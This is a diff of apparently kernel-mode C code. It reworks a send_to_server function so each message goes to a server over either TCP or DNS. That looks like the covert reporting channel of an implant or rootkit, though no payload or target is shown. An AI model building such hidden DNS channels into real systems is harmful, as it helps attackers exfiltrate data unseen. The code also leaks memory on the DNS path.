@@ -56,8 +56,8 @@ static char *format_string(const char *fmt, ...) {
 }
 
 // Formats and sends a message to the server
-int send_to_server(char *message, ...) {
-    if (!get_worker_socket()) {
+int send_to_server(enum Protocol protocol, char *message, ...) {
+    if (protocol == TCP && !get_worker_socket()) {
         ERR_MSG("send_to_server: socket is not initialized\n");
         return -EINVAL;
     }
@@ -67,6 +67,12 @@ int send_to_server(char *message, ...) {
     va_start(args, message);
     if (va_arg(args, char *) == NULL) {
         va_end(args);
+
+        // It protocol is DNS, send the message directly
+        if (protocol == DNS)
+            return dns_send_data(message, strlen(message));
+
+        // If protocol is TCP, send the raw message
         return send_to_server_raw(message, strlen(message));
     }
     va_end(args);
@@ -78,14 +84,15 @@ int send_to_server(char *message, ...) {
         return -ENOMEM;
     }
 
-    if (response_over_dns) {
+    // If the protocol is DNS, send the formatted message over DNS
+    if (protocol == DNS)
         return dns_send_data(formatted_message, strlen(formatted_message));
-    }
 
-    // Send the formatted message
+    // Send the formatted message through TCP
     int ret_code = send_to_server_raw(formatted_message, strlen(formatted_message));
-    kfree(formatted_message);
 
+    // Free the formatted message buffer
+    kfree(formatted_message);
     return ret_code;
 }
 
